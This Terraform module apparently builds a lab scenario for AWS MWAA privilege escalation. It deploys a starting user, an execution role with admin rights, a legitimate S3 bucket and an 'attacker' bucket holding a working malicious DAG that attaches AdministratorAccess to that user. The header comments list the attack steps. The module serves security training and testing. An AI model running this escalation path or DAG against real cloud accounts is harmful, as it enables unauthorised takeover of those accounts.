# Airflow UpdateEnvironment privilege escalation scenario
#
# This scenario demonstrates how a user with airflow:UpdateEnvironment can escalate
# privileges by updating an existing MWAA environment's DAG source to an attacker-
# controlled bucket containing a malicious DAG. The DAG executes with the execution
# role's credentials and can attach AdministratorAccess to the starting user.
#
# Attack path:
# 1. Attacker has airflow:UpdateEnvironment permission on existing MWAA environment
# 2. Updates the environment's source bucket to attacker's S3 bucket with malicious DAG
# 3. Attacker triggers the malicious DAG using airflow:CreateCliToken
# 4. DAG runs with admin execution role credentials
# 5. DAG attaches AdministratorAccess policy to the attacker's user
# 6. Attacker gains admin access
#
# Key difference from mwaa-001: No iam:PassRole needed because the execution role
# is already attached to the environment. Also no ec2:CreateNetworkInterface or
# ec2:CreateVpcEndpoint permissions needed - just EC2 describe permissions for
# MWAA validation.

# Resource naming convention: pl-prod-mwaa-002-to-admin-{resource-type}
# mwaa-002 = Pathfinding.cloud ID for MWAA UpdateEnvironment privilege escalation

terraform {
  required_providers {
    aws = {
      source                = "hashicorp/aws"
      configuration_aliases = [aws.prod]
    }
  }
}

# =============================================================================
# DATA SOURCES
# =============================================================================

# Get current region
data "aws_region" "current" {
  provider = aws.prod
}

# Get available availability zones
data "aws_availability_zones" "available" {
  provider = aws.prod
  state    = "available"
}

# =============================================================================
# STARTING USER (Initial Access Point)
# =============================================================================

# Scenario-specific starting user
resource "aws_iam_user" "starting_user" {
  provider = aws.prod
  name     = "pl-prod-mwaa-002-to-admin-starting-user"

  tags = {
    Name        = "pl-prod-mwaa-002-to-admin-starting-user"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "starting-user"
  }
}

# Create access keys for the starting user
resource "aws_iam_access_key" "starting_user" {
  provider = aws.prod
  user     = aws_iam_user.starting_user.name
}

# Required permissions policy for exploitation
# These permissions were confirmed through testing - MWAA validates EC2/S3 permissions
# even when not changing network config or execution role
resource "aws_iam_user_policy" "starting_user_required" {
  provider = aws.prod
  name     = "pl-prod-mwaa-002-to-admin-required-permissions"
  user     = aws_iam_user.starting_user.name

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "coreAttackPermissions"
        Effect = "Allow"
        Action = [
          "airflow:UpdateEnvironment",
          "airflow:CreateCliToken"
        ]
        Resource = "arn:aws:airflow:${data.aws_region.current.id}:${var.account_id}:environment/pl-prod-mwaa-002-to-admin-env"
      },
      {
        # MWAA validates these EC2 permissions even when not changing network config
        Sid    = "mwaaRequiredEc2Permissions"
        Effect = "Allow"
        Action = [
          "ec2:DescribeSubnets",
          "ec2:DescribeVpcs",
          "ec2:DescribeSecurityGroups"
        ]
        Resource = "*"
      },
      {
        # MWAA validates S3 encryption config
        Sid    = "mwaaRequiredS3Permissions"
        Effect = "Allow"
        Action = [
          "s3:GetEncryptionConfiguration"
        ]
        Resource = "*"
      },
      {
        Sid    = "identityPermission"
        Effect = "Allow"
        Action = [
          "sts:GetCallerIdentity"
        ]
        Resource = "*"
      }
    ]
  })
}

# Helpful additional permissions for demonstration
resource "aws_iam_user_policy" "starting_user_helpful" {
  provider = aws.prod
  name     = "pl-prod-mwaa-002-to-admin-helpful-permissions"
  user     = aws_iam_user.starting_user.name

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "airflowManagement"
        Effect = "Allow"
        Action = [
          "airflow:GetEnvironment"
        ]
        Resource = "arn:aws:airflow:${data.aws_region.current.id}:${var.account_id}:environment/pl-prod-mwaa-002-to-admin-env"
      },
      {
        Sid    = "verifyPrivilegeEscalation"
        Effect = "Allow"
        Action = [
          "iam:ListAttachedUserPolicies"
        ]
        Resource = aws_iam_user.starting_user.arn
      }
    ]
  })
}

# =============================================================================
# TARGET ADMIN ROLE (MWAA Execution Role - Already attached to environment)
# =============================================================================

# Admin role that is already attached to the MWAA environment
# MWAA requires trust from both airflow.amazonaws.com and airflow-env.amazonaws.com
resource "aws_iam_role" "admin_role" {
  provider = aws.prod
  name     = "pl-prod-mwaa-002-to-admin-admin-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = [
            "airflow.amazonaws.com",
            "airflow-env.amazonaws.com"
          ]
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  tags = {
    Name        = "pl-prod-mwaa-002-to-admin-admin-role"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "admin-target"
  }
}

# Attach AdministratorAccess policy to the admin role
resource "aws_iam_role_policy_attachment" "admin_role_admin_access" {
  provider   = aws.prod
  role       = aws_iam_role.admin_role.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

# =============================================================================
# LEGITIMATE S3 BUCKET (Initial DAGs and Startup Script)
# This is the bucket the MWAA environment initially uses
# =============================================================================

resource "aws_s3_bucket" "legitimate_bucket" {
  provider      = aws.prod
  bucket        = "pl-mwaa-002-legitimate-bucket-${var.account_id}-${var.resource_suffix}"
  force_destroy = true # Allow terraform to delete bucket even with versioned objects

  tags = {
    Name        = "pl-mwaa-002-legitimate-bucket"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "legitimate-bucket"
  }
}

# Block public access
resource "aws_s3_bucket_public_access_block" "legitimate_bucket" {
  provider = aws.prod
  bucket   = aws_s3_bucket.legitimate_bucket.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# Enable versioning (required by MWAA)
resource "aws_s3_bucket_versioning" "legitimate_bucket" {
  provider = aws.prod
  bucket   = aws_s3_bucket.legitimate_bucket.id

  versioning_configuration {
    status = "Enabled"
  }
}

# Bucket policy allowing MWAA execution role to access the bucket
resource "aws_s3_bucket_policy" "legitimate_bucket" {
  provider = aws.prod
  bucket   = aws_s3_bucket.legitimate_bucket.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowMWAAAccess"
        Effect = "Allow"
        Principal = {
          AWS = aws_iam_role.admin_role.arn
        }
        Action = [
          "s3:GetObject",
          "s3:GetObjectVersion",
          "s3:ListBucket",
          "s3:ListBucketVersions"
        ]
        Resource = [
          aws_s3_bucket.legitimate_bucket.arn,
          "${aws_s3_bucket.legitimate_bucket.arn}/*"
        ]
      }
    ]
  })
}

# Placeholder DAG (MWAA requires at least one DAG file)
resource "aws_s3_object" "placeholder_dag" {
  provider = aws.prod
  bucket   = aws_s3_bucket.legitimate_bucket.id
  key      = "dags/placeholder_dag.py"
  content  = <<-EOF
"""
Placeholder DAG for MWAA environment.
This minimal DAG is required because MWAA needs at least one DAG file.
"""
from airflow import DAG
from airflow.operators.bash import BashOperator
from datetime import datetime

with DAG(
    dag_id='placeholder_dag',
    start_date=datetime(2024, 1, 1),
    schedule_interval=None,
    catchup=False,
    description='Placeholder DAG for MWAA environment'
) as dag:

    task = BashOperator(
        task_id='placeholder_task',
        bash_command='echo "Placeholder task executed"'
    )
EOF

  tags = {
    Name        = "pl-mwaa-002-placeholder-dag"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "placeholder-dag"
  }
}

# =============================================================================
# ATTACKER'S S3 BUCKET (Malicious DAG)
# This bucket is controlled by the attacker and contains the malicious DAG
# =============================================================================

resource "aws_s3_bucket" "attacker_bucket" {
  provider      = aws.prod
  bucket        = "pl-mwaa-002-attacker-bucket-${var.account_id}-${var.resource_suffix}"
  force_destroy = true # Allow terraform to delete bucket even with versioned objects

  tags = {
    Name        = "pl-mwaa-002-attacker-bucket"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "attacker-bucket"
  }
}

# Block public access
resource "aws_s3_bucket_public_access_block" "attacker_bucket" {
  provider = aws.prod
  bucket   = aws_s3_bucket.attacker_bucket.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# Enable versioning (required for MWAA)
resource "aws_s3_bucket_versioning" "attacker_bucket" {
  provider = aws.prod
  bucket   = aws_s3_bucket.attacker_bucket.id

  versioning_configuration {
    status = "Enabled"
  }
}

# Bucket policy allowing MWAA execution role to read from attacker bucket
# This is how the attacker gets their code executed - the admin role can read
# from the attacker's bucket after the environment is updated
resource "aws_s3_bucket_policy" "attacker_bucket" {
  provider = aws.prod
  bucket   = aws_s3_bucket.attacker_bucket.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowMWAAExecutionRoleAccess"
        Effect = "Allow"
        Principal = {
          AWS = aws_iam_role.admin_role.arn
        }
        Action = [
          "s3:GetObject",
          "s3:GetObjectVersion",
          "s3:ListBucket",
          "s3:ListBucketVersions"
        ]
        Resource = [
          aws_s3_bucket.attacker_bucket.arn,
          "${aws_s3_bucket.attacker_bucket.arn}/*"
        ]
      }
    ]
  })
}

# Malicious DAG that attaches admin policy to starting user
# This DAG uses boto3 to escalate privileges when triggered
resource "aws_s3_object" "malicious_dag" {
  provider = aws.prod
  bucket   = aws_s3_bucket.attacker_bucket.id
  key      = "dags/privesc_dag.py"
  content  = <<-EOF
"""
Malicious DAG for privilege escalation.
This DAG attaches AdministratorAccess to the starting user when triggered.
It executes with the MWAA execution role's credentials.
"""
from airflow import DAG
from airflow.operators.python import PythonOperator
from datetime import datetime
import boto3

def escalate_privileges():
    """Attach AdministratorAccess policy to the starting user."""
    iam = boto3.client('iam')

    user_name = "pl-prod-mwaa-002-to-admin-starting-user"
    policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"

    print(f"Attempting to attach {policy_arn} to {user_name}...")

    try:
        iam.attach_user_policy(
            UserName=user_name,
            PolicyArn=policy_arn
        )
        print(f"SUCCESS: AdministratorAccess attached to {user_name}")
        return f"Privilege escalation successful for {user_name}"
    except Exception as e:
        print(f"FAILED: {str(e)}")
        raise

with DAG(
    dag_id='privesc_dag',
    start_date=datetime(2024, 1, 1),
    schedule_interval=None,
    catchup=False,
    description='Privilege escalation DAG - attaches AdministratorAccess to starting user',
    tags=['privesc', 'mwaa-002']
) as dag:

    escalate_task = PythonOperator(
        task_id='escalate_privileges',
        python_callable=escalate_privileges
    )
EOF

  tags = {
    Name        = "pl-mwaa-002-malicious-dag"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "malicious-dag"
  }

  # Must be created after versioning is enabled so it gets a version ID (required by MWAA)
  depends_on = [aws_s3_bucket_versioning.attacker_bucket]
}

# =============================================================================
# VPC INFRASTRUCTURE (Required for MWAA)
# MWAA requires private subnets in at least 2 AZs with internet access via NAT
# Using CIDR 10.101.0.0/16 to avoid conflict with mwaa-001's 10.100.0.0/16
# =============================================================================

# Dedicated VPC for this scenario
resource "aws_vpc" "mwaa_vpc" {
  provider             = aws.prod
  cidr_block           = "10.101.0.0/16"
  enable_dns_support   = true
  enable_dns_hostnames = true

  tags = {
    Name        = "pl-prod-mwaa-002-vpc"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "mwaa-vpc"
  }
}

# Internet Gateway for public subnet
resource "aws_internet_gateway" "mwaa_igw" {
  provider = aws.prod
  vpc_id   = aws_vpc.mwaa_vpc.id

  tags = {
    Name        = "pl-prod-mwaa-002-igw"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "internet-gateway"
  }
}

# Public subnet for NAT Gateway (in first AZ)
resource "aws_subnet" "public_subnet" {
  provider                = aws.prod
  vpc_id                  = aws_vpc.mwaa_vpc.id
  cidr_block              = "10.101.1.0/24"
  availability_zone       = data.aws_availability_zones.available.names[0]
  map_public_ip_on_launch = true

  tags = {
    Name        = "pl-prod-mwaa-002-public-subnet"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "public-subnet-for-nat"
  }
}

# Private subnet 1 for MWAA (in first AZ)
resource "aws_subnet" "private_subnet_1" {
  provider                = aws.prod
  vpc_id                  = aws_vpc.mwaa_vpc.id
  cidr_block              = "10.101.10.0/24"
  availability_zone       = data.aws_availability_zones.available.names[0]
  map_public_ip_on_launch = false

  tags = {
    Name        = "pl-prod-mwaa-002-private-subnet-1"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "private-subnet-for-mwaa"
  }
}

# Private subnet 2 for MWAA (in second AZ)
resource "aws_subnet" "private_subnet_2" {
  provider                = aws.prod
  vpc_id                  = aws_vpc.mwaa_vpc.id
  cidr_block              = "10.101.11.0/24"
  availability_zone       = data.aws_availability_zones.available.names[1]
  map_public_ip_on_launch = false

  tags = {
    Name        = "pl-prod-mwaa-002-private-subnet-2"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "private-subnet-for-mwaa"
  }
}

# Elastic IP for NAT Gateway
resource "aws_eip" "nat_eip" {
  provider = aws.prod
  domain   = "vpc"

  tags = {
    Name        = "pl-prod-mwaa-002-nat-eip"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "nat-gateway-eip"
  }

  depends_on = [aws_internet_gateway.mwaa_igw]
}

# NAT Gateway in public subnet
resource "aws_nat_gateway" "mwaa_nat" {
  provider      = aws.prod
  allocation_id = aws_eip.nat_eip.id
  subnet_id     = aws_subnet.public_subnet.id

  tags = {
    Name        = "pl-prod-mwaa-002-nat"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "nat-gateway"
  }

  depends_on = [aws_internet_gateway.mwaa_igw]
}

# Route table for public subnet (route to IGW)
resource "aws_route_table" "public_rt" {
  provider = aws.prod
  vpc_id   = aws_vpc.mwaa_vpc.id

  route {
    cidr_block = "0.0.0.0/0"
    gateway_id = aws_internet_gateway.mwaa_igw.id
  }

  tags = {
    Name        = "pl-prod-mwaa-002-public-rt"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "public-route-table"
  }
}

# Route table for private subnets (route to NAT)
resource "aws_route_table" "private_rt" {
  provider = aws.prod
  vpc_id   = aws_vpc.mwaa_vpc.id

  route {
    cidr_block     = "0.0.0.0/0"
    nat_gateway_id = aws_nat_gateway.mwaa_nat.id
  }

  tags = {
    Name        = "pl-prod-mwaa-002-private-rt"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "private-route-table"
  }
}

# Associate public subnet with public route table
resource "aws_route_table_association" "public_subnet_assoc" {
  provider       = aws.prod
  subnet_id      = aws_subnet.public_subnet.id
  route_table_id = aws_route_table.public_rt.id
}

# Associate private subnet 1 with private route table
resource "aws_route_table_association" "private_subnet_1_assoc" {
  provider       = aws.prod
  subnet_id      = aws_subnet.private_subnet_1.id
  route_table_id = aws_route_table.private_rt.id
}

# Associate private subnet 2 with private route table
resource "aws_route_table_association" "private_subnet_2_assoc" {
  provider       = aws.prod
  subnet_id      = aws_subnet.private_subnet_2.id
  route_table_id = aws_route_table.private_rt.id
}

# Security group for MWAA
# MWAA requires a security group that allows self-referencing inbound traffic
resource "aws_security_group" "mwaa_sg" {
  provider    = aws.prod
  name        = "pl-prod-mwaa-002-sg"
  description = "Security group for MWAA environment - allows self-referencing traffic"
  vpc_id      = aws_vpc.mwaa_vpc.id

  # Self-referencing inbound rule (MWAA workers communicate with each other)
  ingress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    self        = true
    description = "Allow all traffic from within the security group (MWAA requirement)"
  }

  # Allow all outbound traffic (for internet access via NAT)
  egress {
    from_port   = 0
    to_port     = 0
    protocol    = "-1"
    cidr_blocks = ["0.0.0.0/0"]
    description = "Allow all outbound traffic"
  }

  tags = {
    Name        = "pl-prod-mwaa-002-sg"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "mwaa-security-group"
  }
}

# =============================================================================
# MWAA ENVIRONMENT (Deployed via Terraform - this is what differentiates mwaa-002)
# The environment initially uses the legitimate bucket and benign startup script.
# The attack involves updating it to use the attacker's bucket/script.
# =============================================================================

resource "aws_mwaa_environment" "mwaa_env" {
  provider = aws.prod
  name     = "pl-prod-mwaa-002-to-admin-env"

  # Use the admin execution role
  execution_role_arn = aws_iam_role.admin_role.arn

  # S3 configuration - initially points to legitimate bucket
  source_bucket_arn = aws_s3_bucket.legitimate_bucket.arn
  dag_s3_path       = "dags/"
  # No startup script - using DAGs for code execution instead

  # Environment size - smallest available
  environment_class = "mw1.small"

  # Airflow version
  airflow_version = "2.8.1"

  # Network configuration
  network_configuration {
    security_group_ids = [aws_security_group.mwaa_sg.id]
    subnet_ids         = [aws_subnet.private_subnet_1.id, aws_subnet.private_subnet_2.id]
  }

  # Private network mode (most common configuration)
  webserver_access_mode = "PRIVATE_ONLY"

  # Logging configuration
  logging_configuration {
    dag_processing_logs {
      enabled   = true
      log_level = "INFO"
    }
    scheduler_logs {
      enabled   = true
      log_level = "INFO"
    }
    task_logs {
      enabled   = true
      log_level = "INFO"
    }
    webserver_logs {
      enabled   = true
      log_level = "INFO"
    }
    worker_logs {
      enabled   = true
      log_level = "INFO"
    }
  }

  # Scaling configuration
  max_workers = 2
  min_workers = 1

  tags = {
    Name        = "pl-prod-mwaa-002-to-admin-env"
    Environment = var.environment
    Scenario    = "airflow-updateenvironment"
    Purpose     = "mwaa-environment"
  }

  # Ensure S3 objects exist before creating the environment
  depends_on = [
    aws_s3_object.placeholder_dag,
    aws_s3_bucket_policy.legitimate_bucket,
    aws_nat_gateway.mwaa_nat,
    aws_route_table_association.private_subnet_1_assoc,
    aws_route_table_association.private_subnet_2_assoc
  ]
}
